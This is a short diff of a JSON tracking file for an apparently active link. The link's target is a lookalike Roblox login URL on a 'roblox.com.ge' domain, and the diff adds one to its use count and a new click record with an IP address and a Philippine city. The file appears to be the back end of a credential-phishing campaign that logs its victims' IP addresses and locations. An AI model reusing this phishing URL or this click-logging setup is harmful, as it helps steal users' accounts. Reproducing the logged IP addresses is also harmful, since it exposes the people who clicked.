@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1259,
+    "useCount": 1260,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10214,6 +10214,14 @@
         "ip": "180.191.240.234",
         "country": "Philippines",
         "city": "General Trias",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777356782286,
+        "ip": "49.145.102.207",
+        "country": "Philippines",
+        "city": "Cebu City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
